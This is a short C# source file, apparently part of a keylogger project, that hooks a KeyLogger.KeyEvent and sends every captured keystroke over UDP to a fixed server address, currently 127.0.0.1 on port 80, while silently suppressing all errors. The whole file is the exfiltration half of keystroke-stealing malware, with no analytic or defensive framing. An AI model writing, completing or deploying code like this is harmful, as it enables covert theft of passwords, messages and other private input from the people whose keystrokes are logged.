﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace KL
{
    internal class UdpClient
    {
        private static System.Net.Sockets.UdpClient client;
        private static IPEndPoint server;
        public static void Start()
        {
            try
            {
               client = new System.Net.Sockets.UdpClient(new Random().Next(1000,10000));
              // client = new System.Net.Sockets.UdpClient(8731);
                server = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 80);
                KeyLogger.KeyEvent += KeyLogger_KeyEvent;
            }
            catch { }
        }

        private static void KeyLogger_KeyEvent(string key)
        {
            if (!string.IsNullOrEmpty(key))
            {
                byte[]message = Encoding.ASCII.GetBytes(key);
                client.Send(message,message.Length,server);
            }
        }
    }
}
